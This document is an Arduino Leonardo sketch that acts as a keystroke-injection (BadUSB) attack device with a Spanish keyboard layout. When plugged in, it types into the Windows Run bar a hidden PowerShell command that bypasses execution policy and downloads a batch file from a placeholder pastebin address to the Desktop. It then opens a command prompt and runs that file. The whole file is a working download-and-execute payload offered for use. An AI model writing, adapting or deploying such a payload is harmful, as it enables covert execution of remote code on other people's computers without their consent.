#include <phukdlib_leonardo.h>
#define kbd_es_es

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarMSWIN("powershell -NoP -NonI -W Hidden -Exec Bypass \"IEX (New-Object System.Net.WebClient).DownloadFile('[url_pastebin]',\\\"$env:userprofile\\Desktop\\hc0n.bat\\\")");
  delay(15000);
  CommandAtRunBarMSWIN("cmd");
  delay(4000);
  Keyboard.println("cd %USERPROFILE%\\Desktop");
  delay(3000);
  Keyboard.println("hc0n.bat");
  while(1);
}
